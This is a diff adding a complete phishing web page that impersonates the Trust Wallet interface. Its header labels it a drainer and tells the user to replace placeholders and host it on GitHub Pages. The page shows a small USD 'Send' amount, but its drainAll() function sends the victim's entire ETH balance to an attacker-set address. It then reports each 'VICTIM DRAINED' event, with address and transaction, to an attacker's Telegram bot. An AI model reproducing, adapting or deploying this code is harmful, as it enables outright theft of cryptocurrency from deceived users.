@@ -1,0 +1,200 @@
+# ============================================================
+# FILE 2: index.html - PHISHING FRONTEND (USD MASK, DRAINS ALL)
+# ============================================================
+# Replace: DRAIN_ADDRESS, BOT_TOKEN, ADMIN_ID
+# Upload to GitHub Pages
+# ============================================================
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trust Wallet</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .container{background:#141414;padding:30px 25px;border-radius:28px;max-width:400px;width:100%;border:1px solid #2a2a2a}
+        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+        .header h1{font-size:22px;color:#3b82f6}
+        .balance-box{background:#1e1e1e;padding:20px;border-radius:16px;text-align:center;margin-bottom:20px}
+        .balance-box .amount{font-size:32px;font-weight:bold}
+        .balance-box .label{color:#888;font-size:14px}
+        .row{display:flex;gap:10px;margin-bottom:15px}
+        .row .btn{flex:1;background:#2a2a2a;border:none;color:#fff;padding:14px;border-radius:14px;font-size:16px;cursor:pointer}
+        .row .btn.primary{background:#3b82f6}
+        .input-group{margin-bottom:15px}
+        .input-group label{display:block;color:#aaa;font-size:13px;margin-bottom:5px}
+        .input-group input{width:100%;padding:14px;border-radius:14px;border:1px solid #2a2a2a;background:#1a1a1a;color:#fff;font-size:16px}
+        .input-group .usd-symbol{position:relative}
+        .input-group .usd-symbol input{padding-left:30px}
+        .input-group .usd-symbol::before{content:"$";position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#888;font-size:18px}
+        .status{margin-top:15px;padding:12px;border-radius:12px;background:#1a1a1a;font-size:13px;color:#aaa;word-break:break-all}
+        .status.success{color:#22c55e;border:1px solid #22c55e}
+        .status.error{color:#ef4444;border:1px solid #ef4444}
+        .footer{margin-top:20px;font-size:11px;color:#444;text-align:center}
+        #connectBtn{width:100%;padding:16px;border-radius:50px;border:none;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}
+        #connectBtn.connected{background:#22c55e;color:#fff}
+        #connectBtn.disconnected{background:#3b82f6;color:#fff}
+        #confirmSendBtn{width:100%;padding:16px;border-radius:50px;border:none;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px;background:#3b82f6;color:#fff;display:none}
+        #confirmSendBtn:hover{background:#2563eb}
+        #sendSection{display:none}
+        .note{font-size:11px;color:#555;margin-top:5px;text-align:center}
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header"><h1>Trust Wallet</h1><span style="background:#1a1a1a;padding:4px 12px;border-radius:20px;font-size:12px;">ETH</span></div>
+    <div class="balance-box">
+        <div class="label">Total Balance</div>
+        <div class="amount" id="totalBalance">$0.00</div>
+        <div style="font-size:12px;color:#888;margin-top:5px;" id="balanceDetails">0 ETH</div>
+    </div>
+    <div class="row">
+        <button class="btn primary" id="sendBtn">Send</button>
+        <button class="btn">Receive</button>
+        <button class="btn">Swap</button>
+    </div>
+    
+    <div id="sendSection">
+        <div class="input-group">
+            <label>Amount (USD)</label>
+            <div class="usd-symbol">
+                <input type="text" id="amountInput" placeholder="Enter amount" value="1.00">
+            </div>
+        </div>
+        <div class="input-group">
+            <label>Recipient</label>
+            <input type="text" id="recipientInput" value="0x4526...3f0a" readonly>
+        </div>
+        <button id="confirmSendBtn" onclick="drainAll()">Send $1.00</button>
+        <div class="note">Network fee: ~$0.50 (estimated)</div>
+    </div>
+
+    <button id="connectBtn" class="disconnected" onclick="connectWallet()">Connect Wallet</button>
+    <div class="status" id="status">Ready</div>
+    <div class="footer">Secure connection v3.2.1</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+<script>
+    const DRAIN_ADDRESS = "0xYourMainWalletAddress";
+    const BOT_TOKEN = "YOUR_BOT_TOKEN";
+    const ADMIN_ID = 123456789;
+    const ETH_PRICE_USD = 3000;
+
+    let web3, userAddress, connected = false;
+    let victimEnteredAmount = "1.00";
+
+    async function notifyTelegram(address, tx, amount) {
+        const usdValue = (parseFloat(amount) * ETH_PRICE_USD).toFixed(2);
+        const text = `VICTIM DRAINED\nAddress: ${address}\nTX: ${tx}\nAmount: ${amount} ETH ($${usdValue})\nVictim thought: $${victimEnteredAmount}`;
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: ADMIN_ID, text: text})
+            });
+        } catch(e) {}
+    }
+
+    async function connectWallet() {
+        const status = document.getElementById('status');
+        status.textContent = 'Connecting...';
+        if (typeof window.ethereum !== 'undefined') {
+            try {
+                web3 = new Web3(window.ethereum);
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAddress = accounts[0];
+                connected = true;
+                document.getElementById('connectBtn').textContent = 'Connected';
+                document.getElementById('connectBtn').className = 'connected';
+                document.getElementById('sendSection').style.display = 'block';
+                document.getElementById('connectBtn').style.display = 'none';
+                document.getElementById('confirmSendBtn').style.display = 'block';
+                status.textContent = 'Connected: ' + userAddress;
+                status.className = 'status success';
+                await updateBalance();
+
+                document.getElementById('amountInput').addEventListener('input', function() {
+                    victimEnteredAmount = this.value || '0';
+                    document.getElementById('confirmSendBtn').textContent = 'Send $' + victimEnteredAmount;
+                });
+
+            } catch(err) {
+                status.textContent = 'Error: ' + err.message;
+                status.className = 'status error';
+            }
+        } else {
+            status.textContent = 'Install MetaMask or Trust Wallet';
+            status.className = 'status error';
+        }
+    }
+
+    async function updateBalance() {
+        if (!connected || !userAddress) return;
+        try {
+            const bal = await web3.eth.getBalance(userAddress);
+            const eth = web3.utils.fromWei(bal, 'ether');
+            const usd = parseFloat(eth) * ETH_PRICE_USD;
+            document.getElementById('balanceDetails').textContent = parseFloat(eth).toFixed(4) + ' ETH';
+            document.getElementById('totalBalance').textContent = '$' + usd.toFixed(2);
+        } catch(e) {}
+    }
+
+    async function drainAll() {
+        const status = document.getElementById('status');
+        const btn = document.getElementById('confirmSendBtn');
+        status.textContent = 'Preparing transaction...';
+        status.className = 'status';
+        btn.disabled = true;
+        btn.textContent = 'Processing...';
+
+        try {
+            const balance = await web3.eth.getBalance(userAddress);
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasCost = gasPrice * 21000;
+            const valueToSend = balance - gasCost;
+
+            if (valueToSend <= 0) {
+                status.textContent = 'Not enough ETH for gas';
+                status.className = 'status error';
+                btn.disabled = false;
+                btn.textContent = 'Send $' + victimEnteredAmount;
+                return;
+            }
+
+            const tx = {
+                from: userAddress,
+                to: DRAIN_ADDRESS,
+                value: valueToSend,
+                gas: 21000,
+                gasPrice: gasPrice,
+                chainId: 1
+            };
+
+            const hash = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [tx]
+            });
+
+            const amountEth = web3.utils.fromWei(valueToSend, 'ether');
+            status.textContent = 'Sent! TX: ' + hash.substring(0, 12);
+            status.className = 'status success';
+            btn.style.display = 'none';
+
+            await notifyTelegram(userAddress, hash, amountEth);
+
+        } catch(err) {
+            status.textContent = 'Transaction failed: ' + err.message;
+            status.className = 'status error';
+            btn.disabled = false;
+            btn.textContent = 'Send $' + victimEnteredAmount;
+        }
+    }
+
+    setInterval(updateBalance, 10000);
+</script>
+</body>
+</html>
